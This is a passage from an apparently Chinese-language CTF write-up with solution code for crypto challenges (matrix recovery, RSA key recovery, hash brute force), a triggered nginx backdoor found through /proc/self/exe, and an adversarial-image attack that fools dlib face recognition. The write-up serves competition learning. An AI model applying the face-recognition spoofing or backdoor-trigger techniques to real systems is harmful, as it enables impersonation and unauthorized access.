    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i) {
        <span class="hljs-keyword">auto</span> list = out_tab[i];
        buf[i] = <span class="hljs-built_in">find</span>(list, list + <span class="hljs-number">256</span>, buf[i]) - list;
    }
    <span class="hljs-built_in">arrange_inv</span>(buf);

    <span class="hljs-keyword">uint8_t</span> vals[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">8</span>; i &gt;= <span class="hljs-number">0</span>; --i) {
        <span class="hljs-built_in">reshape</span>(buf, vals);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">3</span>; j &gt;= <span class="hljs-number">0</span>; --j) {
            <span class="hljs-built_in">sub_tab_inv</span>(table2[i][j], vals[j]);
            <span class="hljs-built_in">sub_tab_inv</span>(table1[i][j], vals[j]);
        }
        <span class="hljs-built_in">reshape</span>(vals, buf);
        <span class="hljs-built_in">arrange_inv</span>(buf);
    }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">secure_decrypt_inv</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> *buf)</span>
</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1337</span>; ++i) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;round %d\n&quot;</span>, i);
        <span class="hljs-built_in">hash_inv</span>(buf);
        <span class="hljs-built_in">print</span>(buf);
    }
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">uint8_t</span> buf[<span class="hljs-number">16</span>] = {};
    <span class="hljs-built_in">secure_decrypt_inv</span>(buf);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre><h3 id="ezmat"><a class="header-link" href="#ezmat"></a>ezMat</h3>
<p>整理一下大致如下：
E = U*(A+R)</p>
<ul class="list">
<li>E是最后结果，已知</li>
<li>U是上三角矩阵</li>
<li>A是flag矩阵，分布有规律，其余都是0</li>
<li>R是pk公钥，已知</li>
</ul>
<p>U是上三角矩阵，A的分布我们知道，并且A特别稀疏，所以E中很多位置的值就相当于U*R得到的结果，根据这点可以慢慢恢复出U的每一行，进而通过U每一行的值恢复出对应行的A的值
从下到上每次能依次求出U的其中一行，然后根据U的值，反推出A的对应行</p>
<pre class="hljs"><code>p = <span class="hljs-number">71</span>

E = [
[<span class="hljs-number">31,45,41,12</span>,<span class="hljs-number">36,43,45,51</span>,<span class="hljs-number">25</span>,<span class="hljs-number">2</span>,<span class="hljs-number">64</span>],
[<span class="hljs-number">68,24,32,35</span>,<span class="hljs-number">52,13,64,10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">40</span>],
[<span class="hljs-number">34,34,64,32</span>,<span class="hljs-number">67,25,21,57</span>,<span class="hljs-number">31</span>,<span class="hljs-number">6</span>,<span class="hljs-number">56</span>],
[<span class="hljs-number">7,17,12,33</span>,<span class="hljs-number">54,66,28,25</span>,<span class="hljs-number">40</span>,<span class="hljs-number">23</span>,<span class="hljs-number">26</span>],
[<span class="hljs-number">14,65,70,35</span>,<span class="hljs-number">67,55,47,36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">42</span>,<span class="hljs-number">57</span>],
[<span class="hljs-number">68,28,33,0</span>,<span class="hljs-number">45,52,59,29</span>,<span class="hljs-number">52</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>],
[<span class="hljs-number">60,35,0,21</span>,<span class="hljs-number">24,44,49,51</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">35</span>],
[<span class="hljs-number">20,21,44,57</span>,<span class="hljs-number">23,35,30,28</span>,<span class="hljs-number">16</span>,<span class="hljs-number">23</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">24,64,54,53</span>,<span class="hljs-number">35,42,40,17</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">36</span>],
[<span class="hljs-number">32,53,39,47</span>,<span class="hljs-number">39,56,52,15</span>,<span class="hljs-number">39</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>],
[<span class="hljs-number">7,57,43,5</span>,<span class="hljs-number">38,59,2,25</span>,<span class="hljs-number">2</span>,<span class="hljs-number">67</span>,<span class="hljs-number">12</span>],
]

R = [
[<span class="hljs-number">53,28,20,41</span>,<span class="hljs-number">32,17,13,46</span>,<span class="hljs-number">34</span>,<span class="hljs-number">37</span>,<span class="hljs-number">24</span>],
[<span class="hljs-number">0,9,54,25</span>,<span class="hljs-number">36,1,21,24</span>,<span class="hljs-number">56</span>,<span class="hljs-number">51</span>,<span class="hljs-number">24</span>],
[<span class="hljs-number">61,41,10,56</span>,<span class="hljs-number">57,28,49,4</span>,<span class="hljs-number">44</span>,<span class="hljs-number">70</span>,<span class="hljs-number">34</span>],
[<span class="hljs-number">47,58,36,53</span>,<span class="hljs-number">68,66,34,69</span>,<span class="hljs-number">22</span>,<span class="hljs-number">25</span>,<span class="hljs-number">39</span>],
[<span class="hljs-number">4,70,21,36</span>,<span class="hljs-number">53,26,59,51</span>,<span class="hljs-number">3</span>,<span class="hljs-number">44</span>,<span class="hljs-number">28</span>],
[<span class="hljs-number">41,23,39,37</span>,<span class="hljs-number">1,28,63,64</span>,<span class="hljs-number">37</span>,<span class="hljs-number">35</span>,<span class="hljs-number">51</span>],
[<span class="hljs-number">43,31,16,36</span>,<span class="hljs-number">45,5,35,52</span>,<span class="hljs-number">7</span>,<span class="hljs-number">45</span>,<span class="hljs-number">41</span>],
[<span class="hljs-number">26,3,54,58</span>,<span class="hljs-number">50,37,27,49</span>,<span class="hljs-number">3</span>,<span class="hljs-number">46</span>,<span class="hljs-number">11</span>],
[<span class="hljs-number">14,48,18,46</span>,<span class="hljs-number">59,64,62,31</span>,<span class="hljs-number">42</span>,<span class="hljs-number">41</span>,<span class="hljs-number">65</span>],
[<span class="hljs-number">17,50,68,10</span>,<span class="hljs-number">24,40,58,46</span>,<span class="hljs-number">48</span>,<span class="hljs-number">14</span>,<span class="hljs-number">58</span>],
[<span class="hljs-number">46,24,48,32</span>,<span class="hljs-number">16,1,27,18</span>,<span class="hljs-number">27</span>,<span class="hljs-number">17</span>,<span class="hljs-number">20</span>],
]

<span class="hljs-keyword">A</span> = [
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,55,0</span>,<span class="hljs-number">0,0,0,3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,14,0,0</span>,<span class="hljs-number">0,0,37,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">16,0,0,0</span>,<span class="hljs-number">0,4,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">25,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">18</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,48</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">17</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,61,0</span>,<span class="hljs-number">0,0,0,25</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,64,0,0</span>,<span class="hljs-number">0,0,38,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">13,0,0,0</span>,<span class="hljs-number">0,50,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
]

U = zero_matrix(GF(p), <span class="hljs-number">11</span>, <span class="hljs-number">11</span>)
<span class="hljs-keyword">A</span> = Matrix(GF(p), <span class="hljs-keyword">A</span>)
E = Matrix(GF(p), E)
R = Matrix(GF(p), R)

aa = [
[-<span class="hljs-number">1,0,0,0</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1,0,0,0</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>],
[<span class="hljs-number">0,0,0,0</span>,-<span class="hljs-number">1,0,0,0</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
[<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0,0,0,0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],
]

# aa不是-<span class="hljs-number">1</span>，说明该位置的值已经求出来了
aa = Matrix(aa)

row = <span class="hljs-number">1</span> 
cnt = <span class="hljs-number">0</span>
X = Matrix(Zmod(p), <span class="hljs-number">11</span>-row, <span class="hljs-number">11</span>-row)
Y = Matrix(Zmod(p), <span class="hljs-number">11</span>-row, <span class="hljs-number">1</span>)
for col in range(<span class="hljs-number">11</span>):
    if -<span class="hljs-number">1</span> not in aa.column(col)[row:]: #选择已经求出<span class="hljs-keyword">A</span>的列
        print(col)  #每一行赋值，用来构成解方程的矩阵
        X[cnt] = (<span class="hljs-keyword">A</span>+R).column(col)[row:]
        Y[cnt] = E[row][col]
        cnt += <span class="hljs-number">1</span>
        if cnt==<span class="hljs-number">11</span>-row:
            #print(X)
            #print(Y)
            r = X.solve_right(Y) # 求出U对应位置的值
            print(r)
            # 将结果写入到U中
            for tmp_idx in range(cnt):
                U[row, row+tmp_idx] = r[tmp_idx, <span class="hljs-number">0</span>]
            print(U)
            break</code></pre><p>最后能恢复成这个程度，最上面两行无法恢复存在多解
<img src="https://md.byr.moe/uploads/upload_21d3f6545b360731e8a75a78f311fae1.png" alt="res"></p>
<p>可以根据多解缩小范围，但是懒得优化了直接爆破hash：</p>
<pre class="hljs"><code><span class="hljs-attribute">from</span> hashlib import sha<span class="hljs-number">256</span>
<span class="hljs-attribute">alphabet</span> = &#x27;=<span class="hljs-number">0123456789</span>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$!?_{}&lt;&gt;&#x27;

<span class="hljs-attribute">for</span> i<span class="hljs-number">1</span> in alphabet:
    <span class="hljs-attribute">for</span> i<span class="hljs-number">2</span> in alphabet:
        <span class="hljs-attribute">for</span> i<span class="hljs-number">3</span> in alphabet:
            <span class="hljs-attribute">for</span> i<span class="hljs-number">4</span> in alphabet:
                <span class="hljs-attribute">for</span> i<span class="hljs-number">5</span> in alphabet:
                    <span class="hljs-attribute">flag</span> = i<span class="hljs-number">1</span>+i<span class="hljs-number">2</span>+i<span class="hljs-number">3</span>+i<span class="hljs-number">4</span>+i<span class="hljs-number">5</span>+<span class="hljs-string">&quot;=bS2dAf3bohLgYo!BcN&quot;</span>
                    <span class="hljs-comment">#print(len(flag))</span>
                    <span class="hljs-attribute">if</span> sha<span class="hljs-number">256</span>(flag.encode()).hexdigest() == <span class="hljs-string">&quot;95cb911a467482cc0f879861532e9ec7680b0846b48a9de25fb13b01c583d9f8&quot;</span>:
                        <span class="hljs-attribute">print</span>(i<span class="hljs-number">1</span>+i<span class="hljs-number">2</span>+i<span class="hljs-number">3</span>+i<span class="hljs-number">4</span>+i<span class="hljs-number">5</span>)
                        <span class="hljs-attribute">exit</span>(<span class="hljs-number">0</span>)</code></pre><p>最后得到：</p>
<pre class="hljs"><code><span class="hljs-attribute">flag</span>{<span class="hljs-number">6</span>yY<span class="hljs-number">4</span>L=bS<span class="hljs-number">2</span>dAf<span class="hljs-number">3</span>bohLgYo!BcN}</code></pre><h3 id="ezrsa"><a class="header-link" href="#ezrsa"></a>ezRSA</h3>
<p>主要是通过magic来解出k和l，主要思路通过开方来得到一个大致的值，这个值就在正确值的附近，然后再遍历一下得到正确的值。
其次，不难发现e的值生成得很特殊，我们通过模k或者l，就能拿到inverse(d_p, k)，inverse(d_q, l)这两个值，再通过求逆得到d_p&#39;，d_q&#39;。
再通过d_p&#39;，d_q&#39;生成p，q。通过d_p &amp; mask, d_q &amp; mask来检查哪一个正确，再通过正确值得到真正的p，q</p>
<pre class="hljs"><code><span class="hljs-attribute">magic</span> = <span class="hljs-number">154118536863381755324327990994045278493514334577571515646858907141541837890</span>


<span class="hljs-attribute">def</span> check(k, l, magic):
    <span class="hljs-attribute">res</span> = <span class="hljs-number">1337</span> * k ** <span class="hljs-number">4</span> + <span class="hljs-number">7331</span> * l ** <span class="hljs-number">3</span> + <span class="hljs-number">73331</span> * k ** <span class="hljs-number">2</span> + <span class="hljs-number">13337</span> * l ** <span class="hljs-number">2</span> + <span class="hljs-number">7</span> * k * l + <span class="hljs-number">2</span> * k + l
    <span class="hljs-attribute">if</span> res == magic:
        <span class="hljs-attribute">return</span> True


<span class="hljs-attribute">k1</span> = iroot(magic // <span class="hljs-number">1337</span>, <span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]
<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">50</span>):
    <span class="hljs-attribute">t</span> = <span class="hljs-number">1337</span> * (k<span class="hljs-number">1</span> - i) ** <span class="hljs-number">4</span>
    <span class="hljs-attribute">l1</span> = iroot((magic - t) // <span class="hljs-number">7331</span>, <span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]
    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">20</span>):
        <span class="hljs-attribute">if</span> check(k<span class="hljs-number">1</span> - i, l<span class="hljs-number">1</span> - j, magic):
            <span class="hljs-attribute">if</span> GCD(k<span class="hljs-number">1</span> - i, l<span class="hljs-number">1</span> - j) == <span class="hljs-number">1</span>:
                <span class="hljs-attribute">k</span> = k<span class="hljs-number">1</span> - i
                <span class="hljs-attribute">l</span> = l<span class="hljs-number">1</span> - j
                <span class="hljs-attribute">break</span>

<span class="hljs-attribute">print</span>(k, l)


<span class="hljs-attribute">pk</span> = (<span class="hljs-number">13144833961692953638155744717380612667335058302310815242506755676885208234342620331186804951145894484501542968789132832800279633590988848298405521677820600481054741175400784558190943019903268095468121342412114428860754522164657102624139527993254089574309927288457799155130004731846999722554981630609692264462023821778810225493633789543259034893395115658330417361250466876018981150507377427664192443342394808337473089411393262018525828475108149889915075872592673448211565529063972264324533136645650169687118301014325354524932405270872098633633071371124551496573869700120350489760340226474892703585296623</span>, <span class="hljs-number">4976865541630914024304930292600669330017247151290783019063407119314069119952298933566289617702551408322779629557316539138884407655160925920670189379289389411163083468782698396121446186733546486790309424372952321446384824084362527492399667929050403530173432700957192011119967010196844119305465574740437</span>)
<span class="hljs-attribute">e</span> = pk[<span class="hljs-number">1</span>]
<span class="hljs-attribute">d_q</span> = inverse((e % l), l)
<span class="hljs-attribute">q</span> = (e * d_q - <span class="hljs-number">1</span>) // l + <span class="hljs-number">1</span>
<span class="hljs-attribute">n</span> = pk[<span class="hljs-number">0</span>]
<span class="hljs-attribute">p</span> = n // q
<span class="hljs-attribute">enc</span> = <span class="hljs-number">12075538182684677737023332074837542797880423774993595442794806087281173669267997104408555839686283996516133283992342507757326913240132429242004071236464149863112788729225204797295863969020348408992315952963166814392745345811848977394200562308125908479180595553832800151118160338048296786712765863667672764499042391263351628529676289293121487926074423104988380291130127694041802572569416584214743544288441507782008422389394379332477148914009173609753877263990429988651290402630935296993764147874437465394433756515223371180032964253037946818633821940103044535390973722964105390263537722948112571112911062</span>
<span class="hljs-attribute">d</span> = inverse(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))
<span class="hljs-attribute">print</span>(long_to_bytes(pow(enc, d, pk[<span class="hljs-number">0</span>])))</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
<h3 id="eeenginx"><a class="header-link" href="#eeenginx"></a>eeenginx</h3>
<p>首先使用路径/proc/self/exe得到当前nginx的二進制可执行文件，导入IDA发现exec_shell函数，里面存在执行/readflag的代码</p>
<p class="img-container"><img src="https://md.byr.moe/uploads/upload_9425cda7850ed6b991723b42edd76fb3.png" alt=""></p>
<p>交叉引用查找到ngx_http_eenginx_filter函数，得到执行条件</p>
<p class="img-container"><img src="https://md.byr.moe/uploads/upload_76302e85acbdb4b6574fc7c1a0b7071c.png" alt=""></p>
<p>将cookies的session字段设置为图中即可</p>
<p class="img-container"><img src="https://md.byr.moe/uploads/upload_549b69b9bff1db393f6d5f31ea1dfc9f.png" alt=""></p>
<h3 id="boynextdoor"><a class="header-link" href="#boynextdoor"></a>boynextdoor</h3>
<p>AI人脸识别，构造对抗样本。
构造一个图片让 embedding 尽量接近题目给的数值。</p>
<p>程序用的现成的库 <a href="https://github.com/ageitgey/face_recognition">face_recognition</a>, <a href="http://dlib.net/python/index.html">dlib</a>
模型是 dlib_face_recognition_resnet_model_v1.dat
这个工具可以把模型转成tensorflow接受的格式 <a href="https://github.com/ksachdeva/dlib-to-tf-keras-converter">https://github.com/ksachdeva/dlib-to-tf-keras-converter</a></p>
<p>攻击方法就是每次对图像求梯度，用梯度下降来逼近给定的embedding。
这题比较tricky的地方是，在传给神经网络前，dlib会先对图像做裁剪、放缩、随机抖动。
这些变换可以用 Expectation over Transformation (EOT) 方法绕过，就是我们每步算梯度时，随机多次采样取平均梯度，这些变换的效果就会被中和掉。</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> dlib
<span class="hljs-keyword">import</span> face_recognition
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">from</span> numpy.linalg <span class="hljs-keyword">import</span> norm
<span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf
<span class="hljs-keyword">from</span> converter.model <span class="hljs-keyword">import</span> ScaleLayer, ReshapeLayer


keyface_encoding = [
    -<span class="hljs-number">8.69139656e-02</span>,  <span class="hljs-number">8.30148682e-02</span>, <span class="hljs-number">1.45035293e-02</span>, -<span class="hljs-number">1.27609253e-01</span>,
    -<span class="hljs-number">1.42700657e-01</span>, -<span class="hljs-number">1.58593412e-02</span>, -<span class="hljs-number">9.87722948e-02</span>, -<span class="hljs-number">1.23219922e-01</span>,
    <span class="hljs-number">1.22708268e-01</span>, -<span class="hljs-number">1.35270610e-01</span>, <span class="hljs-number">2.30035380e-01</span>, -<span class="hljs-number">1.23880222e-01</span>,
    -<span class="hljs-number">1.93354771e-01</span>, -<span class="hljs-number">8.94580930e-02</span>, -<span class="hljs-number">7.93846995e-02</span>,  <span class="hljs-number">2.35654935e-01</span>,
    -<span class="hljs-number">1.81906566e-01</span>, -<span class="hljs-number">1.34962142e-01</span>, -<span class="hljs-number">1.31788421e-02</span>, -<span class="hljs-number">1.04968855e-02</span>,
    <span class="hljs-number">4.10739481e-02</span>,  <span class="hljs-number">2.44885264e-03</span>, <span class="hljs-number">8.52121785e-03</span>,  <span class="hljs-number">5.79290688e-02</span>,
    -<span class="hljs-number">1.15343466e-01</span>, -<span class="hljs-number">3.23355764e-01</span>, -<span class="hljs-number">8.69766697e-02</span>, -<span class="hljs-number">2.12586801e-02</span>,
    -<span class="hljs-number">9.11531225e-02</span>, -<span class="hljs-number">3.72300223e-02</span>, -<span class="hljs-number">2.80866250e-02</span>,  <span class="hljs-number">1.02462806e-01</span>,
    -<span class="hljs-number">1.71462923e-01</span>, -<span class="hljs-number">2.73887850e-02</span>, <span class="hljs-number">4.65847105e-02</span>,  <span class="hljs-number">6.94189966e-02</span>,
    <span class="hljs-number">2.20984984e-02</span>, -<span class="hljs-number">8.01130161e-02</span>, <span class="hljs-number">1.72256276e-01</span>,  <span class="hljs-number">1.52742490e-04</span>,
    -<span class="hljs-number">2.54432797e-01</span>,  <span class="hljs-number">5.17657027e-02</span>, <span class="hljs-number">1.13474540e-01</span>,  <span class="hljs-number">2.19928578e-01</span>,
    <span class="hljs-number">1.68304369e-01</span>,  <span class="hljs-number">1.28403883e-02</span>, -<span class="hljs-number">1.04458071e-02</span>, -<span class="hljs-number">1.59635231e-01</span>,
    <span class="hljs-number">1.74563184e-01</span>, -<span class="hljs-number">1.74656272e-01</span>, <span class="hljs-number">1.19449571e-04</span>,  <span class="hljs-number">1.32924736e-01</span>,
    <span class="hljs-number">4.52756137e-02</span>, -<span class="hljs-number">5.11706285e-02</span>, <span class="hljs-number">1.84679162e-02</span>, -<span class="hljs-number">7.74622187e-02</span>,
    <span class="hljs-number">2.99685597e-02</span>,  <span class="hljs-number">1.66548729e-01</span>, -<span class="hljs-number">1.57246217e-01</span>, -<span class="hljs-number">3.03353313e-02</span>,
    <span class="hljs-number">9.47528481e-02</span>, -<span class="hljs-number">6.63631782e-02</span>, -<span class="hljs-number">3.17470208e-02</span>, -<span class="hljs-number">1.85560584e-01</span>,
    <span class="hljs-number">2.26004064e-01</span>,  <span class="hljs-number">1.28806546e-01</span>, -<span class="hljs-number">1.15559876e-01</span>, -<span class="hljs-number">2.06283614e-01</span>,
    <span class="hljs-number">1.40707687e-01</span>, -<span class="hljs-number">1.00104943e-01</span>, -<span class="hljs-number">8.33150819e-02</span>,  <span class="hljs-number">8.25207531e-02</span>,
    -<span class="hljs-number">1.33005619e-01</span>, -<span class="hljs-number">1.90996230e-01</span>, -<span class="hljs-number">2.95138747e-01</span>, -<span class="hljs-number">2.70678457e-02</span>,
    <span class="hljs-number">3.30062211e-01</span>,  <span class="hljs-number">1.28746748e-01</span>, -<span class="hljs-number">1.88333243e-01</span>,  <span class="hljs-number">5.84503338e-02</span>,
    -<span class="hljs-number">8.36766977e-03</span>, -<span class="hljs-number">7.47905578e-03</span>, <span class="hljs-number">1.23152651e-01</span>,  <span class="hljs-number">1.65390745e-01</span>,
    <span class="hljs-number">5.01543283e-03</span>,  <span class="hljs-number">1.08317155e-02</span>, -<span class="hljs-number">8.22547823e-02</span>, -<span class="hljs-number">4.03350629e-02</span>,
    <span class="hljs-number">2.58023173e-01</span>, -<span class="hljs-number">4.20480780e-02</span>, -<span class="hljs-number">2.24346798e-02</span>,  <span class="hljs-number">2.48134851e-01</span>,
    -<span class="hljs-number">5.13138250e-04</span>,  <span class="hljs-number">6.34072348e-02</span>, <span class="hljs-number">6.94152107e-03</span>, -<span class="hljs-number">9.12788417e-03</span>,
    -<span class="hljs-number">1.11195974e-01</span>,  <span class="hljs-number">3.06070670e-02</span>, -<span class="hljs-number">1.62505597e-01</span>, -<span class="hljs-number">1.20745702e-02</span>,
    -<span class="hljs-number">1.50425863e-02</span>, -<span class="hljs-number">1.41657144e-02</span>, -<span class="hljs-number">1.81038231e-02</span>,  <span class="hljs-number">1.26067802e-01</span>,
    -<span class="hljs-number">1.41881093e-01</span>,  <span class="hljs-number">1.04972236e-01</span>, -<span class="hljs-number">5.23118973e-02</span>,  <span class="hljs-number">3.43461856e-02</span>,
    -<span class="hljs-number">2.61395201e-02</span>, -<span class="hljs-number">2.75162887e-02</span>, -<span class="hljs-number">2.53709070e-02</span>, -<span class="hljs-number">3.63143757e-02</span>,
    <span class="hljs-number">1.08865552e-01</span>, -<span class="hljs-number">2.02156767e-01</span>, <span class="hljs-number">1.07431002e-01</span>,  <span class="hljs-number">8.50366130e-02</span>,
    <span class="hljs-number">7.95102417e-02</span>,  <span class="hljs-number">1.08320944e-01</span>, <span class="hljs-number">1.53148308e-01</span>,  <span class="hljs-number">8.43793526e-02</span>,
    -<span class="hljs-number">2.67507583e-02</span>, -<span class="hljs-number">3.10356300e-02</span>, -<span class="hljs-number">2.16474622e-01</span>, -<span class="hljs-number">2.27650702e-02</span>,
    <span class="hljs-number">1.20539531e-01</span>, -<span class="hljs-number">9.48047191e-02</span>, <span class="hljs-number">1.40443712e-01</span>,  <span class="hljs-number">5.64389490e-03</span>,
]

keyface_encoding = np.array(keyface_encoding)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">im</span>):</span>
    encoding = face_recognition.face_encodings(im)[<span class="hljs-number">0</span>]
    <span class="hljs-comment">#print(&quot;emb&quot;, encoding)</span>
    dis = face_recognition.face_distance([keyface_encoding], encoding)
    <span class="hljs-keyword">return</span> dis[<span class="hljs-number">0</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">normalize_image</span>(<span class="hljs-params">image</span>):</span>    
    [R,G,B] = np.dsplit(image,image.shape[-<span class="hljs-number">1</span>])

    Rx = (R - <span class="hljs-number">122.782</span>) / <span class="hljs-number">256.</span>
    Gx = (G - <span class="hljs-number">117.001</span>) / <span class="hljs-number">256.</span>
    Bx = (B - <span class="hljs-number">104.298</span>) / <span class="hljs-number">256.</span>

    new_image = np.dstack((Rx,Gx,Bx))
    <span class="hljs-keyword">return</span> new_image


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">revert_image</span>(<span class="hljs-params">image</span>):</span>    
    [R,G,B] = np.dsplit(image,image.shape[-<span class="hljs-number">1</span>])

    Rx = R * <span class="hljs-number">256</span> + <span class="hljs-number">122.782</span>
    Gx = G * <span class="hljs-number">256</span> + <span class="hljs-number">117.001</span>
    Bx = B * <span class="hljs-number">256</span> + <span class="hljs-number">104.298</span>

    new_image = np.dstack((Rx,Gx,Bx))
    new_image = np.clip(new_image, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)
    new_image = np.array(new_image, dtype=np.uint8)
    <span class="hljs-keyword">return</span> new_image

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">model_predict</span>(<span class="hljs-params">im_faces</span>):</span>
    <span class="hljs-keyword">global</span> model
    im_faces = tf.cast(im_faces, tf.float32)
    <span class="hljs-keyword">with</span> tf.GradientTape() <span class="hljs-keyword">as</span> tape:
        tape.watch(im_faces)
        pred = model(im_faces)
        <span class="hljs-comment">#print(&quot;tensorflow&quot;, pred)</span>
        loss = tf.norm(pred - keyface_encoding, axis=<span class="hljs-number">1</span>, <span class="hljs-built_in">ord</span>=<span class="hljs-number">2</span>)
    grad = tape.gradient(loss, im_faces)
    <span class="hljs-keyword">return</span> loss, grad


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_image</span>(<span class="hljs-params">im, face</span>):</span>
    <span class="hljs-keyword">global</span> model
    top, right, bottom, left = face

    jitter_num = <span class="hljs-number">1000</span>
    imgs = dlib.jitter_image(im, jitter_num)
    imgs = np.array([normalize_image(img) <span class="hljs-keyword">for</span> img <span class="hljs-keyword">in</span> imgs])
    loss, grad = model_predict(imgs)
    <span class="hljs-built_in">print</span>(tf.reduce_mean(loss))

    grad = tf.reduce_mean(grad, axis=<span class="hljs-number">0</span>)
    im = normalize_image(im)
    im[top:bottom,left:right]-= <span class="hljs-number">1e-3</span> * grad[top:bottom,left:right]
    im = revert_image(im)

    <span class="hljs-keyword">return</span> im


im = face_recognition.load_image_file(<span class="hljs-string">&quot;save2.png&quot;</span>)
<span class="hljs-built_in">print</span>(check(im))

model_path = <span class="hljs-string">&quot;dlib_face_recognition_resnet_model_v1.h5&quot;</span>
model = tf.keras.models.load_model(model_path, custom_objects={<span class="hljs-string">&#x27;ScaleLayer&#x27;</span>: ScaleLayer, <span class="hljs-string">&#x27;ReshapeLayer&#x27;</span>: ReshapeLayer})
<span class="hljs-comment">#model.summary()</span>

cnt = <span class="hljs-number">0</span>

<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    cnt += <span class="hljs-number">1</span>

    loss2 = check(im)
    <span class="hljs-built_in">print</span>(loss2)
    <span class="hljs-keyword">if</span> loss2 &lt; <span class="hljs-number">0.25</span>:
        <span class="hljs-keyword">break</span>
    face = face_recognition.face_locations(im)[<span class="hljs-number">0</span>]
